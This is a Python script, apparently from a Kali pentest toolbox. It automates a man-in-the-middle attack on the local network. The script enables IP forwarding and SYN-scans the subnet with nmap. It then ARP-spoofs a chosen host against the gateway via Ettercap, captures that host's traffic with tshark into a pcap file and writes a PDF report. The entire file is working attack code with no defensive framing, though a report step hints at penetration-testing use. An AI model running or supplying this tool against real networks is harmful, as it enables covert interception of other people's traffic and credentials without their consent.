import subprocess
import nmap
import netifaces
import ipaddress
import os
import time
from reportlab.lib.pagesizes import letter
from reportlab.pdfgen import canvas

# Function to enable IP forwarding
def enable_ip_forwarding():
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    print("[+] IP forwarding enabled.")

# Function to disable IP forwarding
def disable_ip_forwarding():
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print("[+] IP forwarding disabled.")

# Function to get the local network
def get_local_network():
    gateways = netifaces.gateways()
    default_gateway = gateways['default'][netifaces.AF_INET][0]
    interface = gateways['default'][netifaces.AF_INET][1]
    addresses = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]
    network_address = addresses['addr']
    netmask = addresses['netmask']
    cidr = ipaddress.ip_network(f"{network_address}/{netmask}", strict=False)
    return cidr, default_gateway

# Function to scan the network for active hosts and open ports
def scan_network(cidr):
    scanner = nmap.PortScanner()
    ports = "80,443,20,21,25,143,110,53,22,23"
    scanner.scan(hosts=str(cidr), arguments=f'-sS -Pn -n -p {ports}')
    interesting_hosts = {}
    for host in scanner.all_hosts():
        open_ports = []
        for proto in scanner[host].all_protocols():
            for port in scanner[host][proto]:
                if scanner[host][proto][port]['state'] == 'open':
                    open_ports.append(port)
        if open_ports:
            interesting_hosts[host] = open_ports
    return interesting_hosts

# Function to start ARP spoofing using Ettercap
def start_arp_spoofing(target_ip, gateway_ip):
    ettercap_command = f"ettercap -T -M arp:remote /{target_ip}// /{gateway_ip}//"
    print(f"[+] Starting ARP spoofing between {target_ip} and {gateway_ip}...")
    try:
        # Start the Ettercap process
        ettercap_process = subprocess.Popen(ettercap_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return ettercap_process
    except subprocess.CalledProcessError as e:
        print(f"[-] An error occurred while starting Ettercap: {e}")
        return None

# Function to stop ARP spoofing by killing Ettercap process
def stop_arp_spoofing(ettercap_process):
    if ettercap_process:
        ettercap_process.terminate()
        ettercap_process.wait()
        print("[+] ARP spoofing stopped.")

# Function to capture traffic in real time
def real_time_capture(ip, duration=60):
    pcap_file = f"capture_{ip}.pcap"
    capture_command = f"tshark -i any -a duration:{duration} -f \"host {ip}\" -w {pcap_file}"
    print(f"Starting real-time capture on {ip} using interface any...")
    try:
        subprocess.run(capture_command, shell=True, check=True)
        print(f"Capture completed. PCAP file saved as {pcap_file}")
    except subprocess.CalledProcessError as e:
        print(f"An error occurred: {e}")
    return pcap_file

# Function to generate PDF report
def generate_pdf_for_capture(ip, pcap_file):
    directory = "/home/kali/Documents/ToolsBox/compte_rendu/captures"
    if not os.path.exists(directory):
        os.makedirs(directory)
    pdf_filename = f"{directory}/capture_report_{ip}.pdf"
    c = canvas.Canvas(pdf_filename, pagesize=letter)
    c.drawString(72, 800, f"Traffic Capture Report for {ip}")
    c.drawString(72, 780, "-----------------------------")
    c.drawString(72, 760, f"PCAP File: {pcap_file}")
    c.drawString(72, 740, f"Size: {os.path.getsize(pcap_file)} bytes")
    c.drawString(72, 720, f"Timestamp: {time.ctime()}")
    c.save()
    print(f"[+] PDF report generated: {pdf_filename}")

# Function for port menu to capture traffic
def port_menu(host, gateway_ip):
    duration = int(input("Enter duration of capture in seconds: "))
    # Start ARP spoofing using Ettercap
    ettercap_process = start_arp_spoofing(host, gateway_ip)
    if ettercap_process:
        try:
            pcap_file = real_time_capture(host, duration)
            generate_pdf_for_capture(host, pcap_file)
        except KeyboardInterrupt:
            print("[+] Stopping ARP spoofing...")
        finally:
            stop_arp_spoofing(ettercap_process)
            print("[+] ARP spoofing stopped.")

# Function for main user menu to select a host
def user_menu(interesting_hosts, gateway_ip):
    if not interesting_hosts:
        print("No interesting hosts found.")
        return
    print("Select a host to capture traffic:")
    hosts_list = list(interesting_hosts.keys())
    for index, host in enumerate(hosts_list, start=1):
        ports = [str(port) for port in interesting_hosts[host]]
        print(f"{index}. {host} on ports {', '.join(ports)}")
    while True:
        try:
            choice = int(input("Enter your choice: "))
            if 1 <= choice <= len(hosts_list):
                host = hosts_list[choice - 1]
                port_menu(host, gateway_ip)
                break
            else:
                print("Invalid selection, please try again.")
        except ValueError:
            print("Invalid input, please enter a number.")

# Main execution
if __name__ == "__main__":
    enable_ip_forwarding()
    network_cidr, gateway_ip = get_local_network()
    interesting_hosts = scan_network(network_cidr)
    user_menu(interesting_hosts, gateway_ip)
    disable_ip_forwarding()
